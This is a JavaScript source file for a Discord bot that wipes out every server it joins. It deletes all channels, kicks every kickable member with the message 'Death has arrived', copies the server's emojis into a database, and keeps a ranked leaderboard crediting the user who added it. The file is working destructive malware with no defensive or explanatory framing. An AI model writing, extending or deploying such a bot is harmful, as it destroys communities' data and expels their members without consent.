import Prisma from "@prisma/client";
import fs from "fs";

const { PrismaClient } = Prisma;
const prisma = new PrismaClient();
const LOG_PATH = process.env.LOG_PATH || "./logs";
const KICK_MSG = process.env.KICK_MSG || "Death has arrived";
const BOT_ID = process.env.BOT_ID || "936295987499122788";

let emojiCounter = 0;
let textChannelCounter = 0;
let voiceChannelCounter = 0;
let killCounter = 0;

const StealEmoji = async (g, serverId) => {
  let emojis = [];

  await g.emojis.fetch().then((emo) =>
    emo.map((e) => {
      emojiCounter++;
      emojis.push({
        name: e.name,
        url: e.url,
        serverId: serverId,
      });
    })
  );

  return emojis.map((e) =>
    prisma.emojis.create({
      data: { name: e.name, url: e.url, serverId: e.serverId },
    })
  );
};

const PurgeChannels = async (g) => {
  await g.channels.fetch().then((channels) =>
    channels.map((ch) => {
      ch.delete();
      ch.isText() ? textChannelCounter++ : voiceChannelCounter++;
    })
  );
};

const PurgeMembers = async (g) => {
  await g.members
    .fetch()
    .then((members) =>
      members.map((m) => m.kickable && m.kick(KICK_MSG) && killCounter++)
    );
};

const Logging = () => {
  let logMsg = `
    [${new Date().toISOString()}] 
    [INFO] Death has arrived to: ${g.name} 
    Deaths: ${killCounter}, 
    Text Channels: ${textChannelCounter}, 
    Voice Channels: ${voiceChannelCounter}, 
    Total: ${textChannelCounter + voiceChannelCounter} \n`;

  fs.appendFile(`${LOG_PATH}/log.txt`, logMsg, (err) => {
    if (err) throw err;
  });
};

const UpdateStats = () => {
  return prisma.deathStats.upsert({
    where: {
      id: 1,
    },
    update: {
      servers: { increment: 1 },
      kills: { increment: killCounter },
      textChannels: { increment: textChannelCounter },
      voiceChannels: { increment: voiceChannelCounter },
    },
    create: {
      id: 1,
      servers: 0,
      kills: 0,
      textChannels: 0,
      voiceChannels: 0,
    },
  });
};

const UpdateUserRanking = async (client, g) => {
  let intergations = await g.fetchIntegrations();
  for (const [key, int] of intergations.entries()) {
    if (int.application.id == BOT_ID) {
      let deathbringer = client.users.cache.find(
        (user) => user.id === int.user.id
      );
      return [
        deathbringer.id,
        prisma.deathbringer.upsert({
          where: {
            id: parseInt(int.user.id),
          },
          update: {
            killedServersCount: { increment: 1 },
            removedTextChannels: { increment: textChannelCounter },
            removedVoiceChannels: { increment: voiceChannelCounter },
          },
          create: {
            username: deathbringer.username,
            userId: deathbringer.id,
            killedServersCount: 1,
            removedTextChannels: textChannelCounter,
            removedVoiceChannels: voiceChannelCounter,
          },
        }),
      ];
    }
  }
};

export const Purge = (client) => {
  client.guilds.cache.map(async (g) => {
    let [killerId, deathbringerUpdate] = await UpdateUserRanking(client, g);

    const serverInsert = await prisma.purgedServer.create({
      data: {
        name: g.name,
        serverId: g.id,
        ownerId: g.ownerId,
        memberCount: g.memberCount,
        premiumTier: g.premiumTier,
        emojiCount: emojiCounter,
        killerId: parseInt(killerId) || 0,
      },
    });

    await PurgeChannels(g);
    await PurgeMembers(g);
    let emojiBatchInsert = await StealEmoji(g, serverInsert.serverId);
    let statUpdate = UpdateStats(g);

    await prisma.$transaction([
      ...emojiBatchInsert,
      statUpdate,
      deathbringerUpdate,
    ]);

    Logging();
    //g.leave();
  });
};
